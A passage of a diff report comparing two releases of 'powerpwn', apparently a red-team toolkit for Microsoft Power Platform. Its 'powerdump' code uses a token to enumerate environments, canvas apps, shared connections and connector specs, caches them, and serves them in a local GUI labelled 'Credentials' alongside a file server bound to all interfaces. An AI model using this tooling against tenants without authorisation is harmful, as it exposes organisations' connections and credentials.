+                                type=rbac["properties"]["principal"].get("type"),
+                                tenant_id=rbac["properties"]["principal"].get("tenantId", "N/A"),
+                                display_name=rbac["properties"]["principal"].get("displayName"),
+                                email=rbac["properties"]["principal"].get("email"),
+                                upn=rbac["properties"]["principal"].get("email"),
+                                raw_json=rbac,
+                            )
+                        )
+
+                created_by = Principal(
+                    entity_type=ResourceType.principal,
+                    entity_id=canvas_app["properties"]["createdBy"].get("id"),
+                    principal_id=canvas_app["properties"]["createdBy"].get("id"),
+                    type=canvas_app["properties"]["createdBy"].get("type"),
+                    tenant_id=canvas_app["properties"]["createdBy"].get("tenantId", "N/A"),
+                    display_name=canvas_app["properties"]["createdBy"].get("displayName"),
+                    email=canvas_app["properties"]["createdBy"].get("email"),
+                    upn=canvas_app["properties"]["createdBy"].get("userPrincipalName"),
+                    raw_json=canvas_app["properties"]["createdBy"],
+                )
+
+                run_url = canvas_app["properties"]["appPlayUri"]
+                version = canvas_app["properties"]["appVersion"]
+                environment_id = canvas_app["properties"]["environment"]["name"].replace("default", "Default")
+
+                yield CanvasApp(
+                    raw_json=canvas_app,
+                    display_name=canvas_app["properties"]["displayName"],
+                    created_by=created_by,
+                    created_at=canvas_app["properties"]["createdTime"],
+                    last_modified_at=canvas_app["properties"]["lastModifiedTime"],
+                    run_url=run_url,
+                    version=version,
+                    permissions=principals,
+                    entity_id=canvas_app["name"],
+                    environment_id=environment_id,
+                    entity_type=ResourceType.canvas_app,
+                )
+        logger.info(
+            f"Found {total_widely_shared_canvas_apps} widely shared applications out of {total_canvas_apps} canvas apps in environment {environment_id}"
+        )
+
+    def resource_type(self) -> ResourceType:
+        return ResourceType.canvas_app
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py`

 * *Ordering differences only*

 * *Files 10% similar despite different names*

```diff
@@ -1,85 +1,85 @@
-import logging
-from typing import Dict, Generator, List
-
-import requests
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.powerdump.collect.models.connection_entity import Connection
-from powerpwn.powerdump.collect.models.principal_entity import Principal
-from powerpwn.powerdump.collect.resources_collectors._api import list_connections
-from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
-from powerpwn.powerdump.collect.resources_collectors.iresource_collector import IResourceCollector
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-class ConnectionsCollector(IResourceCollector):
-    def __init__(self, connector_id_to_connection_ids: Dict[str, List[str]]) -> None:
-        self.__connector_id_to_connection_ids = connector_id_to_connection_ids
-
-    def collect(self, session: requests.Session, environment_id: str) -> Generator[Connection, None, None]:
-        total_connections_count = 0
-        active_shareable_connections_count = 0
-        raw_connections = list_connections(session, environment_id=environment_id)
-
-        for raw_connection in raw_connections:
-            total_connections_count += 1
-            if raw_connection["properties"]["apiId"] != "/providers/Microsoft.PowerApps/apis/shared_logicflows" and (
-                raw_connection["properties"]["statuses"][0]["status"] != "Connected"
-            ):
-                # ignore non-active or non shareable connections, other than Logic Flows
-                continue
-
-            active_shareable_connections_count += 1
-            principal = Principal(
-                entity_type=ResourceType.principal,
-                entity_id=raw_connection["properties"]["createdBy"].get("id"),
-                principal_id=raw_connection["properties"]["createdBy"].get("id"),
-                type=raw_connection["properties"]["createdBy"].get("type"),
-                tenant_id=raw_connection["properties"]["createdBy"].get("tenantId", "N/A"),
-                display_name=raw_connection["properties"]["createdBy"].get("displayName"),
-                email=raw_connection["properties"]["createdBy"].get("email"),
-                upn=raw_connection["properties"]["createdBy"].get("userPrincipalName"),
-                raw_json=raw_connection["properties"]["createdBy"],
-            )
-
-            connection_props = {
-                "accountName": raw_connection["properties"].get("accountName"),
-                **raw_connection["properties"].get("connectionParameters", {}),
-                **raw_connection["properties"].get("connectionParametersSet", {}),
-            }
-
-            connection = Connection(
-                entity_type=ResourceType.connection,
-                entity_id=raw_connection["name"],
-                connection_id=raw_connection["name"],
-                display_name=raw_connection["properties"]["displayName"],
-                is_valid=all([status_obj["status"] == "Connected" for status_obj in raw_connection["properties"]["statuses"]]),
-                connector_id=raw_connection["properties"]["apiId"].replace("/providers/Microsoft.PowerApps/apis/", ""),
-                api_id=raw_connection["properties"]["apiId"],
-                icon_uri=raw_connection["properties"]["iconUri"],
-                environment_id=raw_connection["properties"]["environment"]["id"]
-                .replace("/providers/Microsoft.PowerApps/environments/", "")
-                .replace("default", "Default"),
-                environment_name=raw_connection["properties"]["environment"]["name"],
-                created_at=raw_connection["properties"]["createdTime"],
-                last_modified_at=raw_connection["properties"]["lastModifiedTime"],
-                expiration_time=raw_connection["properties"].get("expirationTime"),
-                created_by=principal,
-                connection_parameters=connection_props,
-                test_uri=raw_connection["properties"].get("testLinks", [{}])[0].get("requestUri"),
-                shareable=raw_connection["properties"]["allowSharing"],
-                raw_json=raw_connection,
-            )
-
-            self.__connector_id_to_connection_ids[connection.connector_id] = self.__connector_id_to_connection_ids.get(
-                connection.connector_id, []
-            ) + [connection.connection_id]
-
-            yield connection
-        logger.info(
-            f"Found {active_shareable_connections_count} active shareable connections out of {total_connections_count} connections in environment {environment_id}"
-        )
-
-    def resource_type(self) -> ResourceType:
-        return ResourceType.connection
+import logging
+from typing import Dict, Generator, List
+
+import requests
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.powerdump.collect.models.connection_entity import Connection
+from powerpwn.powerdump.collect.models.principal_entity import Principal
+from powerpwn.powerdump.collect.resources_collectors._api import list_connections
+from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
+from powerpwn.powerdump.collect.resources_collectors.iresource_collector import IResourceCollector
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+class ConnectionsCollector(IResourceCollector):
+    def __init__(self, connector_id_to_connection_ids: Dict[str, List[str]]) -> None:
+        self.__connector_id_to_connection_ids = connector_id_to_connection_ids
+
+    def collect(self, session: requests.Session, environment_id: str) -> Generator[Connection, None, None]:
+        total_connections_count = 0
+        active_shareable_connections_count = 0
+        raw_connections = list_connections(session, environment_id=environment_id)
+
+        for raw_connection in raw_connections:
+            total_connections_count += 1
+            if raw_connection["properties"]["apiId"] != "/providers/Microsoft.PowerApps/apis/shared_logicflows" and (
+                raw_connection["properties"]["statuses"][0]["status"] != "Connected"
+            ):
+                # ignore non-active or non shareable connections, other than Logic Flows
+                continue
+
+            active_shareable_connections_count += 1
+            principal = Principal(
+                entity_type=ResourceType.principal,
+                entity_id=raw_connection["properties"]["createdBy"].get("id"),
+                principal_id=raw_connection["properties"]["createdBy"].get("id"),
+                type=raw_connection["properties"]["createdBy"].get("type"),
+                tenant_id=raw_connection["properties"]["createdBy"].get("tenantId", "N/A"),
+                display_name=raw_connection["properties"]["createdBy"].get("displayName"),
+                email=raw_connection["properties"]["createdBy"].get("email"),
+                upn=raw_connection["properties"]["createdBy"].get("userPrincipalName"),
+                raw_json=raw_connection["properties"]["createdBy"],
+            )
+
+            connection_props = {
+                "accountName": raw_connection["properties"].get("accountName"),
+                **raw_connection["properties"].get("connectionParameters", {}),
+                **raw_connection["properties"].get("connectionParametersSet", {}),
+            }
+
+            connection = Connection(
+                entity_type=ResourceType.connection,
+                entity_id=raw_connection["name"],
+                connection_id=raw_connection["name"],
+                display_name=raw_connection["properties"]["displayName"],
+                is_valid=all([status_obj["status"] == "Connected" for status_obj in raw_connection["properties"]["statuses"]]),
+                connector_id=raw_connection["properties"]["apiId"].replace("/providers/Microsoft.PowerApps/apis/", ""),
+                api_id=raw_connection["properties"]["apiId"],
+                icon_uri=raw_connection["properties"]["iconUri"],
+                environment_id=raw_connection["properties"]["environment"]["id"]
+                .replace("/providers/Microsoft.PowerApps/environments/", "")
+                .replace("default", "Default"),
+                environment_name=raw_connection["properties"]["environment"]["name"],
+                created_at=raw_connection["properties"]["createdTime"],
+                last_modified_at=raw_connection["properties"]["lastModifiedTime"],
+                expiration_time=raw_connection["properties"].get("expirationTime"),
+                created_by=principal,
+                connection_parameters=connection_props,
+                test_uri=raw_connection["properties"].get("testLinks", [{}])[0].get("requestUri"),
+                shareable=raw_connection["properties"]["allowSharing"],
+                raw_json=raw_connection,
+            )
+
+            self.__connector_id_to_connection_ids[connection.connector_id] = self.__connector_id_to_connection_ids.get(
+                connection.connector_id, []
+            ) + [connection.connection_id]
+
+            yield connection
+        logger.info(
+            f"Found {active_shareable_connections_count} active shareable connections out of {total_connections_count} connections in environment {environment_id}"
+        )
+
+    def resource_type(self) -> ResourceType:
+        return ResourceType.connection
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,62 +1,65 @@
-import logging
-from typing import Dict, Generator, List
-
-import requests
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.powerdump.collect.models.connector_entity import Connector
-from powerpwn.powerdump.collect.resources_collectors._api import get_connector
-from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
-from powerpwn.powerdump.collect.resources_collectors.iresource_collector import IResourceCollector
-from powerpwn.powerdump.utils.const import SPEC_JWT_NAME
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-class ConnectorsCollector(IResourceCollector):
-    def __init__(self, connector_id_to_connection_ids: Dict[str, List[str]]) -> None:
-        self.__connector_id_to_connection_ids = connector_id_to_connection_ids
-
-    def collect(self, session: requests.Session, environment_id: str) -> Generator[Connector, None, None]:
-        for connector_id in self.__connector_id_to_connection_ids:
-            logger.info(f"Fetching OpenAPI spec for connector {connector_id}.")
-
-            try:
-                connector = get_connector(session, environment_id=environment_id, connector_id=connector_id)
-            except RuntimeError as e:
-                if "403" in str(e):
-                    logger.warning(f"User doesn't have access to custom connector spec for connector_id={connector_id}. Skipping spec.")
-                    continue
-                raise e
-
-            swagger = connector["properties"]["swagger"]
-
-            swagger["securityDefinitions"] = swagger.get("securityDefinitions", {})
-            swagger["securityDefinitions"][SPEC_JWT_NAME] = {
-                "name": "Authorization",
-                "in": "header",
-                "type": "apiKey",
-                "description": "JWT Authorization header",
-            }
-
-            swagger["security"] = swagger.get("security", [])
-            swagger["security"].append({"ApiHubBearerAuth": []})
-
-            spec = Connector(
-                api_name=connector_id,
-                display_name=connector_id,
-                environment_id=environment_id,
-                created_at=connector["properties"]["createdTime"],
-                last_modified_at=connector["properties"]["changedTime"],
-                created_by=connector["properties"]["publisher"],
-                version=connector["properties"]["swagger"]["info"]["version"],
-                swagger=swagger,
-                entity_id=connector_id,
-                entity_type=ResourceType.connector,
-                raw_json=connector,
-            )
-
-            yield spec
-
-    def resource_type(self) -> ResourceType:
-        return ResourceType.connector
+import logging
+from typing import Dict, Generator, List
+
+import requests
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.powerdump.collect.models.connector_entity import Connector
+from powerpwn.powerdump.collect.resources_collectors._api import get_connector
+from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
+from powerpwn.powerdump.collect.resources_collectors.iresource_collector import IResourceCollector
+from powerpwn.powerdump.utils.const import SPEC_JWT_NAME
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+class ConnectorsCollector(IResourceCollector):
+    def __init__(self, connector_id_to_connection_ids: Dict[str, List[str]]) -> None:
+        self.__connector_id_to_connection_ids = connector_id_to_connection_ids
+
+    def collect(self, session: requests.Session, environment_id: str) -> Generator[Connector, None, None]:
+        for connector_id in self.__connector_id_to_connection_ids:
+            logger.info(f"Fetching OpenAPI spec for connector {connector_id}.")
+
+            try:
+                connector = get_connector(session, environment_id=environment_id, connector_id=connector_id)
+            except RuntimeError as e:
+                if "403" in str(e):
+                    logger.warning(f"User doesn't have access to custom connector spec for connector_id={connector_id}. Skipping spec.")
+                    continue
+                elif "400" in str(e):
+                    logger.error(f"Failed to get connector {connector_id} for connection {self.__connector_id_to_connection_ids[connector_id]}")
+                    continue
+                raise e
+
+            swagger = connector["properties"]["swagger"]
+
+            swagger["securityDefinitions"] = swagger.get("securityDefinitions", {})
+            swagger["securityDefinitions"][SPEC_JWT_NAME] = {
+                "name": "Authorization",
+                "in": "header",
+                "type": "apiKey",
+                "description": "JWT Authorization header",
+            }
+
+            swagger["security"] = swagger.get("security", [])
+            swagger["security"].append({"ApiHubBearerAuth": []})
+
+            spec = Connector(
+                api_name=connector_id,
+                display_name=connector_id,
+                environment_id=environment_id,
+                created_at=connector["properties"]["createdTime"],
+                last_modified_at=connector["properties"]["changedTime"],
+                created_by=connector["properties"]["publisher"],
+                version=connector["properties"]["swagger"]["info"]["version"],
+                swagger=swagger,
+                entity_id=connector_id,
+                entity_type=ResourceType.connector,
+                raw_json=connector,
+            )
+
+            yield spec
+
+    def resource_type(self) -> ResourceType:
+        return ResourceType.connector
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py`

 * *Ordering differences only*

 * *Files 14% similar despite different names*

```diff
@@ -1,54 +1,54 @@
-import logging
-import os.path
-from typing import Dict, Generator, List
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
-from powerpwn.powerdump.collect.resources_collectors._api import list_environments
-from powerpwn.powerdump.collect.resources_collectors.canvas_apps_collector import CanvasAppsCollector
-from powerpwn.powerdump.collect.resources_collectors.connections_collector import ConnectionsCollector
-from powerpwn.powerdump.collect.resources_collectors.connectors_collector import ConnectorsCollector
-from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
-from powerpwn.powerdump.utils.const import DATA_MODEL_FILE_EXTENSION
-from powerpwn.powerdump.utils.path_utils import env_entity_type_path
-from powerpwn.powerdump.utils.requests_wrapper import init_session
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-class ResourcesCollector:
-    """
-    A Class to collect resources and cache them in provided cache path
-    """
-
-    def __init__(self, cache_path: str, token: str) -> None:
-        self.__cache_path = cache_path
-        self.__session = init_session(token=token)
-        self.__collectors = [CanvasAppsCollector, ConnectionsCollector, ConnectorsCollector]
-
-    def collect_and_cache(self) -> None:
-        """
-        Collect resources and store them in cache
-
-        Args:
-            cache_path (str): cache path to store resources
-        """
-        environment_ids = list_environments(self.__session)
-        logger.info(f"Found {len(environment_ids)} environments.")
-
-        for env_id in environment_ids:
-            connector_id_to_connection_ids: Dict[str, List[str]] = dict()
-            for collector in self.__collectors:
-                if collector in (ConnectionsCollector, ConnectorsCollector):
-                    collector_instance = collector(connector_id_to_connection_ids)
-                else:
-                    collector_instance = collector()
-                self._cache_entities(collector_instance.collect(self.__session, env_id), collector_instance.resource_type(), env_id)
-
-    def _cache_entities(self, entities: Generator[ResourceEntityBase, None, None], entity_type: ResourceType, env_id: str) -> None:
-        dir_name = env_entity_type_path(env_id, entity_type, self.__cache_path)
-        os.makedirs(dir_name, exist_ok=True)
-        for entity in entities:
-            file_path = os.path.join(dir_name, entity.entity_id + DATA_MODEL_FILE_EXTENSION)
-            with open(file_path, "w") as fp:
-                fp.write(entity.json())
+import logging
+import os.path
+from typing import Dict, Generator, List
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
+from powerpwn.powerdump.collect.resources_collectors._api import list_environments
+from powerpwn.powerdump.collect.resources_collectors.canvas_apps_collector import CanvasAppsCollector
+from powerpwn.powerdump.collect.resources_collectors.connections_collector import ConnectionsCollector
+from powerpwn.powerdump.collect.resources_collectors.connectors_collector import ConnectorsCollector
+from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
+from powerpwn.powerdump.utils.const import DATA_MODEL_FILE_EXTENSION
+from powerpwn.powerdump.utils.path_utils import env_entity_type_path
+from powerpwn.powerdump.utils.requests_wrapper import init_session
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+class ResourcesCollector:
+    """
+    A Class to collect resources and cache them in provided cache path
+    """
+
+    def __init__(self, cache_path: str, token: str) -> None:
+        self.__cache_path = cache_path
+        self.__session = init_session(token=token)
+        self.__collectors = [CanvasAppsCollector, ConnectionsCollector, ConnectorsCollector]
+
+    def collect_and_cache(self) -> None:
+        """
+        Collect resources and store them in cache
+
+        Args:
+            cache_path (str): cache path to store resources
+        """
+        environment_ids = list_environments(self.__session)
+        logger.info(f"Found {len(environment_ids)} environments.")
+
+        for env_id in environment_ids:
+            connector_id_to_connection_ids: Dict[str, List[str]] = dict()
+            for collector in self.__collectors:
+                if collector in (ConnectionsCollector, ConnectorsCollector):
+                    collector_instance = collector(connector_id_to_connection_ids)
+                else:
+                    collector_instance = collector()
+                self._cache_entities(collector_instance.collect(self.__session, env_id), collector_instance.resource_type(), env_id)
+
+    def _cache_entities(self, entities: Generator[ResourceEntityBase, None, None], entity_type: ResourceType, env_id: str) -> None:
+        dir_name = env_entity_type_path(env_id, entity_type, self.__cache_path)
+        os.makedirs(dir_name, exist_ok=True)
+        for entity in entities:
+            file_path = os.path.join(dir_name, entity.entity_id + DATA_MODEL_FILE_EXTENSION)
+            with open(file_path, "w") as fp:
+                fp.write(entity.json())
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/gui/gui.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/gui/gui.py`

 * *Files 23% similar despite different names*

```diff
@@ -1,47 +1,51 @@
-import logging
-import os
-import pathlib
-import subprocess  # nosec
-
-from flask import Flask
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.powerdump.gui.prep import (
-    flt_connection_table_wrapper,
-    flt_resource_wrapper,
-    full_canvasapps_table_wrapper,
-    full_connection_table_wrapper,
-    full_connectors_table_wrapper,
-    full_logic_flows_table_wrapper,
-    full_resources_table_wrapper,
-    register_specs,
-)
-
-
-class Gui:
-    def run(self, cache_path: str) -> None:
-        # run file browser
-        subprocess.Popen(["browsepy", "0.0.0.0", "8080", "--directory", cache_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # nosec
-
-        # run resources flask app
-        app = Flask(__name__, template_folder=self.__get_template_full_path())
-        register_specs(app=app, cache_path=cache_path)
-        app.route("/")(full_resources_table_wrapper(cache_path=cache_path))
-        app.route("/credentials")(full_connection_table_wrapper(cache_path=cache_path))
-        app.route("/automation")(full_logic_flows_table_wrapper(cache_path=cache_path))
-        app.route("/app/")(full_canvasapps_table_wrapper(cache_path))
-        app.route("/connector/")(full_connectors_table_wrapper(cache_path))
-        app.route("/<connector_id>/")(flt_connection_table_wrapper(cache_path=cache_path))
-        app.route("/<resource_type>/<env_id>/<resource_id>")(flt_resource_wrapper(cache_path=cache_path))
-
-        logger = logging.getLogger(LOGGER_NAME)
-        logger.info("Application is running on http://127.0.0.1:5000")
-
-        # turn off server logs
-        log = logging.getLogger("werkzeug")
-        log.setLevel(logging.ERROR)
-
-        app.run()
-
-    def __get_template_full_path(self) -> str:
-        return os.path.join(pathlib.Path(__file__).parent.resolve(), "templates")
+import logging
+import os
+import pathlib
+import subprocess  # nosec
+
+from flask import Flask
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.powerdump.gui.prep import (
+    env_resources_table_by_resource_type_wrapper,
+    env_resources_table_wrapper,
+    flt_connection_table_wrapper,
+    flt_resource_wrapper,
+    full_canvasapps_table_wrapper,
+    full_connection_table_wrapper,
+    full_connectors_table_wrapper,
+    full_logic_flows_table_wrapper,
+    full_resources_table_wrapper,
+    register_specs,
+)
+
+
+class Gui:
+    def run(self, cache_path: str) -> None:
+        # run file browser
+        subprocess.Popen(["browsepy", "0.0.0.0", "8080", "--directory", cache_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # nosec
+
+        # run resources flask app
+        app = Flask(__name__, template_folder=self.__get_template_full_path())
+        register_specs(app=app, cache_path=cache_path)
+        app.route("/")(full_resources_table_wrapper(cache_path=cache_path))
+        app.route("/env/<env_id>")(env_resources_table_wrapper(cache_path=cache_path))
+        app.route("/env/<env_id>/<resource_type>")(env_resources_table_by_resource_type_wrapper(cache_path=cache_path))
+        app.route("/credentials")(full_connection_table_wrapper(cache_path=cache_path))
+        app.route("/automation")(full_logic_flows_table_wrapper(cache_path=cache_path))
+        app.route("/app/")(full_canvasapps_table_wrapper(cache_path))
+        app.route("/connector/")(full_connectors_table_wrapper(cache_path))
+        app.route("/credentials/<connector_id>/")(flt_connection_table_wrapper(cache_path=cache_path))
+        app.route("/env/<env_id>/<resource_type>/<resource_id>")(flt_resource_wrapper(cache_path=cache_path))
+
+        logger = logging.getLogger(LOGGER_NAME)
+        logger.info("Application is running on http://127.0.0.1:5000")
+
+        # turn off server logs
+        log = logging.getLogger("werkzeug")
+        log.setLevel(logging.ERROR)
+
+        app.run()
+
+    def __get_template_full_path(self) -> str:
+        return os.path.join(pathlib.Path(__file__).parent.resolve(), "templates")
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/base.html` & `powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/base.html`

 * *Ordering differences only*

 * *Files 14% similar despite different names*

```diff
@@ -1,32 +1,32 @@
-<!doctype html>
-<html>
-  <head>
-    <title>{{ title }}</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
-    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.25/css/dataTables.bootstrap5.css">
-  </head>
-  <body>
-    <div class="container">
-      <h1>{{ title }}</h1>
-      <hr>
-      <div class="layout">
-        <div class="menu">
-          <ul>
-            <li><a href="/">All Resources</a></li>
-            <li><a href="/credentials">Credentials</a></li>
-            <li><a href="/automation">Automations</a></li>
-            <li><a href="/app">Applications</a></li>
-            <li><a href="/connector">Connectors</a></li>
-          </ul>
-        </div>
-        <div class="content">
-          {% block content %}{% endblock %}
-        </div>
-      </div>
-    </div>
-    <script type="text/javascript" charset="utf8" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.25/js/jquery.dataTables.js"></script>
-    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.25/js/dataTables.bootstrap5.js"></script>
-    {% block scripts %}{% endblock %}
-  </body>
+<!doctype html>
+<html>
+  <head>
+    <title>{{ title }}</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.25/css/dataTables.bootstrap5.css">
+  </head>
+  <body>
+    <div class="container">
+      <h1>{{ title }}</h1>
+      <hr>
+      <div class="layout">
+        <div class="menu">
+          <ul>
+            <li><a href="/">All Resources</a></li>
+            <li><a href="/credentials">Credentials</a></li>
+            <li><a href="/automation">Automations</a></li>
+            <li><a href="/app">Applications</a></li>
+            <li><a href="/connector">Connectors</a></li>
+          </ul>
+        </div>
+        <div class="content">
+          {% block content %}{% endblock %}
+        </div>
+      </div>
+    </div>
+    <script type="text/javascript" charset="utf8" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.25/js/jquery.dataTables.js"></script>
+    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.25/js/dataTables.bootstrap5.js"></script>
+    {% block scripts %}{% endblock %}
+  </body>
 </html>
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/canvasapps_table.html` & `powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/canvasapps_table.html`

 * *Files 25% similar despite different names*

```diff
@@ -1,40 +1,40 @@
-{% extends "base.html" %}
-
-{% block content %}
-  <table id="data" class="table table-striped">
-    <thead>
-      <tr>
-        <th>Display name</th>
-        <th>Environment </th>
-        <th>Version</th>
-        <th>Created by</th>
-        <th>Created at </th>
-        <th>Last modified at </th>
-      </tr>
-    </thead>
-    <tbody>
-      {% for canvasapp in resources %}
-        <tr>
-          <td>{{ canvasapp.display_name }}</td>
-          <td>{{ canvasapp.environment_id }}</td>
-          <td>{{ canvasapp.version }}</td>
-          <td>{{ canvasapp.created_by.email }}</td>
-          <td>{{ canvasapp.created_at }}</td>
-          <td>{{ canvasapp.last_modified_at }}</td>
-          <td><a href="{{ canvasapp.run_url }}" target="_blank">Run</a> </td>
-          <td><a href="/app/{{ canvasapp.environment_id }}/{{ canvasapp.entity_id }}">Raw</a> </td>
-        </tr>
-      {% endfor %}
-    </tbody>
-  </table>
-{% endblock %}
-
-{% block scripts %}
-  <script>
-    $(document).ready(function () {
-      $('#data').DataTable({
-        scrollX: true
-      });
-    });
-  </script>
+{% extends "base.html" %}
+
+{% block content %}
+  <table id="data" class="table table-striped">
+    <thead>
+      <tr>
+        <th>App</th>
+        <th>Environment </th>
+        <th>Version</th>
+        <th>Created by</th>
+        <th>Created at </th>
+        <th>Last modified at </th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for canvasapp in resources %}
+        <tr>
+          <td>{{ canvasapp.display_name }}</td>
+          <td><a href="/env/{{ canvasapp.environment_id }}/app">{{ canvasapp.environment_id }}</a> </td>
+          <td>{{ canvasapp.version }}</td>
+          <td>{{ canvasapp.created_by.email }}</td>
+          <td>{{ canvasapp.created_at }}</td>
+          <td>{{ canvasapp.last_modified_at }}</td>
+          <td><a href="{{ canvasapp.run_url }}" target="_blank">Run</a> </td>
+          <td><a href="/env/{{ canvasapp.environment_id }}/app/{{ canvasapp.entity_id }}">Raw</a> </td>
+        </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+{% endblock %}
+
+{% block scripts %}
+  <script>
+    $(document).ready(function () {
+      $('#data').DataTable({
+        scrollX: true
+      });
+    });
+  </script>
 {% endblock %}
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/connections_table.html` & `powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/connectors_table.html`

 * *Files 26% similar despite different names*

```diff
@@ -1,47 +1,39 @@
-{% extends "base.html" %}
-
-{% block content %}
-  <table id="data" class="table table-striped">
-    <thead>
-      <tr>
-        <th></th>
-        <th>Connector</th>
-        <th>Connection</th>
-        <th>Environment </th>
-        <th>Is valid</th>
-        <th>Last modified at</th>
-        <th>Expires at</th>
-        <th>Created by</th>
-        <th>Shareable</th>
-      </tr>
-    </thead>
-    <tbody>
-      {% for connection in resources %}
-        <tr>
-          <td><img src="{{ connection.icon_uri }}" class="img-thumbnail" alt="{{ connection.connection_id }}" width="25"></td>
-          <td><a href="/{{ connection.connector_id }}">{{ connection.connector_id }}</a></td>
-          <td>{{ connection.display_name }}</td>
-          <td>{{ connection.environment_id }}</td>
-          <td>{{ connection.is_valid }}</td>
-          <td>{{ connection.last_modified_at }}</td>
-          <td>{{ connection.expiration_time }}</td>
-          <td>{{ connection.created_by.email }}</td>
-          <td>{{ connection.shareable }}</td>
-          <td><a href="/api/{{ connection.connector_id }}/{{ connection.connection_id }}">Playground</a></td>
-          <td><a href="/credentials/{{ connection.environment_id }}/{{ connection.entity_id }}">Raw</a> </td>
-          <td><a href="http://127.0.0.1:8080/browse/data/{{ connection.environment_id }}/connections/{{connection.connector_id}}/{{connection.entity_id}}" target="_blank">Dump</a> </td>
-        </tr>
-      {% endfor %}
-    </tbody>
-  </table>
-{% endblock %}
-
-{% block scripts %}
-  <script>
-    $(document).ready(function () {
-      $('#data').DataTable({
-        scrollX: true
-      });
-    });
-  </script>
+{% extends "base.html" %}
+
+{% block content %}
+  <table id="data" class="table table-striped">
+    <thead>
+      <tr>
+        <th>Connector</th>
+        <th>Environment</th>
+        <th>Version</th>
+        <th>Created by</th>
+        <th>Created at </th>
+        <th>Last modified at </th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for connector in resources %}
+        <tr>
+          <td>{{ connector.display_name }}</td>
+          <td><a href="/env/{{ connector.environment_id }}/{{connector.entity_type}}">{{ connector.environment_id }}</a> </td>
+          <td>{{ connector.version }}</td>
+          <td>{{ connector.created_by }}</td>
+          <td>{{ connector.created_at }}</td>
+          <td>{{ connector.last_modified_at }}</td>
+          <td><a href="/env/{{ connector.environment_id }}/{{ connector.entity_type}}/{{ connector.entity_id }}">Raw</a> </td>
+        </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+{% endblock %}
+
+{% block scripts %}
+  <script>
+    $(document).ready(function () {
+      $('#data').DataTable({
+        scrollX: true
+      });
+    });
+  </script>
 {% endblock %}
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/gui/templates/logic_flows_table.html` & `powerpwn-2.1.5/src/powerpwn/powerdump/gui/templates/connections_table.html`

 * *Files 23% similar despite different names*

```diff
@@ -1,46 +1,47 @@
-{% extends "base.html" %}
-
-{% block content %}
-  <table id="data" class="table table-striped">
-    <thead>
-      <tr>
-        <th></th>
-        <th>Connector</th>
-        <th>Connection</th>
-        <th>Environment </th>
-        <th>Is valid</th>
-        <th>Last modified at</th>
-        <th>Expires at</th>
-        <th>Created by</th>
-        <th>Shareable</th>
-      </tr>
-    </thead>
-    <tbody>
-      {% for connection in resources %}
-        <tr>
-          <td><img src="{{ connection.icon_uri }}" class="img-thumbnail" alt="{{ connection.connection_id }}" width="25"></td>
-          <td><a href="/{{ connection.connector_id }}">{{ connection.connector_id }}</a></td>
